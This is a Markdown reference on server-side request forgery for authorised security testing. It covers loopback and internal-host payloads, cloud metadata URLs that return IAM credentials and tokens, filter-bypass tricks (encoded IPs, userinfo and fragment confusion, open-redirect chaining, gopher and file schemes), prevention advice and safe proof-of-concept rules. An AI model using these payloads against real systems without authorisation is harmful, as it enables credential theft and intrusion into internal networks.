# SSRF — Deep Reference

Server-Side Request Forgery: induce the server-side application to make HTTP (or other-protocol) requests to an unintended location. Impact is defined by what the forged request *reaches and returns*.

Sources:
- https://portswigger.net/web-security/ssrf
- https://portswigger.net/web-security/ssrf/blind

---

## 1. Standard SSRF

### 1.1 Against the server itself (loopback)
The app fetches a user-supplied URL; point it at the server's own loopback to hit functionality that trusts local requests (admin panels often skip auth for `localhost`).
```
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded

stockApi=http://localhost/admin
```
Loopback variants to try: `127.0.0.1`, `localhost`, `[::1]`, `0.0.0.0`, `127.1`.
Once `/admin` is reachable, prove impact by performing an action (e.g. `http://localhost/admin/delete?username=carlos`) only if in scope and non-destructive enough for a SAFE PoC — otherwise just demonstrate read access to the admin interface.

### 1.2 Against back-end systems
Internal hosts on private ranges that users can't reach directly are often implicitly trusted.
```
stockApi=http://192.168.0.68/admin
```
Map live hosts by sweeping ranges and diffing response length / status / timing:
- `10.0.0.0/8`
- `172.16.0.0/12`
- `192.168.0.0/16`
- Common internal ports: 80, 443, 8080, 8443, 6379 (Redis), 11211 (Memcached), 9200 (Elasticsearch), 2375 (Docker), 5000, 8500 (Consul), 3306, 5432.

---

## 2. Cloud metadata endpoints (highest impact — credential theft)

### AWS (IMDS)
- Base: `http://169.254.169.254/latest/meta-data/`
- IAM creds: `http://169.254.169.254/latest/meta-data/iam/security-credentials/` → returns role name → append role:
  `http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>` → JSON with `AccessKeyId`, `SecretAccessKey`, `Token`.
- User data: `http://169.254.169.254/latest/user-data/`
- IMDSv2 (token-required): the server must send `X-aws-ec2-metadata-token`. SSRF can only exploit IMDSv2 if it can also set that header / make the required PUT — IMDSv2 is a common mitigation. IMDSv1 (no header) is the easy win.

### Google Cloud (GCP)
- Base: `http://metadata.google.internal/computeMetadata/v1/` (also `http://169.254.169.254/computeMetadata/v1/`)
- Requires header `Metadata-Flavor: Google` (older `X-Google-Metadata-Request: True` may work).
- Service-account token: `.../computeMetadata/v1/instance/service-accounts/default/token`
- Project / instance attributes: `.../instance/attributes/`, `.../project/`

### Azure
- Instance: `http://169.254.169.254/metadata/instance?api-version=2021-02-01` with header `Metadata: true`.
- OAuth token (managed identity): `http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/` with header `Metadata: true`.

### DigitalOcean / Oracle / Alibaba / Kubernetes
- DigitalOcean: `http://169.254.169.254/metadata/v1.json`
- Oracle OCI: `http://169.254.169.254/opc/v1/instance/`
- Alibaba: `http://100.100.100.100/latest/meta-data/`
- Kubernetes API (from a pod): `https://kubernetes.default.svc/`, kubelet `:10250`.

When metadata needs a header the simple `url=` param can't set, this becomes blind/partial — note that in the finding.

---

## 3. Blind SSRF (response not reflected)

The server issues the request but its response is not returned in the front-end. Harder, generally lower impact, but can chain to RCE.

### Detection via OAST
- Inject a unique collaborator/OAST hostname into the param.
- **HTTP interaction received** → confirmed SSRF that makes outbound HTTP.
- **DNS-only interaction** → server resolves but outbound HTTP is filtered; still SSRF, weaker.
- **No interaction** → param not used for a request, or fully filtered.

### Exploitation of blind SSRF
1. Probe internal IP/host ranges using OAST payloads to fingerprint which hosts/ports respond (timing + callback differentials).
2. Hit known-vulnerable internal services where a request alone has effect (no response needed).
3. Control the response from your server (e.g. via redirect to attacker host) to exploit a vulnerability in the client-side parser the server uses — potential RCE.

---

## 4. Circumventing defenses

### 4.1 Blacklist-based filters (block `127.0.0.1`, `localhost`, etc.)
- Alternative IP representations of `127.0.0.1`:
  - Decimal: `2130706433`
  - Octal: `017700000001`, `0177.0.0.1`
  - Hex: `0x7f000001`, `0x7f.0x0.0x0.0x1`
  - Shortened: `127.1`, `0`, `0.0.0.0`
  - Mixed: `127.0.0.1.nip.io`
- IPv6: `[::1]`, `[::ffff:127.0.0.1]`, `[0:0:0:0:0:ffff:127.0.0.1]`
- Register a domain that resolves to `127.0.0.1` or an internal IP (e.g. via your own DNS / `*.nip.io` / `*.sslip.io`).
- Obfuscation: URL-encode (`%2e`, `%6c`) or case-vary blocked strings (`LOCALHOST`, `Localhost`).
- Redirect: supply a URL you control that 30x-redirects to the blocked target; many fetchers follow redirects after the filter check. Switch protocol on redirect (`http`→`https`) to dodge protocol-specific filters.

### 4.2 Whitelist-based filters (must contain an allowed host)
Exploit URL-parser inconsistencies between the validator and the requester:
- Embedded credentials (userinfo): `https://expected-host:fakepass@evil-host/` — parsers may read `expected-host` while the request goes to `evil-host`.
- Fragment: `https://evil-host#expected-host`
- DNS subdomain: `https://expected-host.evil-host/`
- Path/look-alike: `https://evil-host/expected-host`
- Double URL encoding to defeat recursive decoders.
- Combine the above (e.g. creds + fragment).

### 4.3 Open-redirect chaining
If a whitelisted host has an open redirect, the filter passes (host is allowed) and the server follows the redirect to an internal target:
```
stockApi=http://weliketoshop.net/product/nextProduct?currentProductId=6&path=http://192.168.0.68/admin
```

### 4.4 Protocol abuse (where supported)
- `gopher://` to craft raw TCP payloads (Redis/Memcached/SMTP) — strong RCE/data path when the fetcher allows it.
- `file://` for local file read, `dict://`, `ftp://`. Test which schemes the fetcher honors.

---

## 5. Finding hidden attack surface
- **Partial URLs:** a param supplies only a hostname or path that the server joins into a full URL — still controllable.
- **URLs inside data formats:** XML/SAML/SVG/OpenOffice parsing → XXE escalates to SSRF; JSON/YAML fields that hold URLs.
- **Referer header:** analytics/SEO software that fetches the `Referer` value server-side — inject an internal/OAST URL there.
- Less obvious sinks: PDF/screenshot renderers (headless Chrome → try `file://`, `http://localhost`), webhook test buttons, "validate URL" helpers, image proxies, favicon fetchers.

---

## 6. Prevention (for triage / remediation advice)
- Allowlist by resolved IP, not by string match; re-resolve after redirects (anti-rebinding).
- Block requests to private/link-local/loopback ranges including `169.254.0.0/16`.
- Disable unused URL schemes; do not follow redirects, or re-validate each hop.
- Enforce IMDSv2 (token-required) in AWS; restrict metadata access by hop-limit / firewall.
- Never reflect raw back-end responses to the client.

---

## 7. SAFE PoC discipline
- Demonstrate reach with a single read request; capture the returned internal/metadata data as proof.
- Do not pivot beyond what proves impact; reaching internal services must stay within authorization.
- No destructive actions, no mass internal scanning beyond what's needed to show a reachable host.
- Log the curl repro + evidence to `./_EXPLOIT/`.
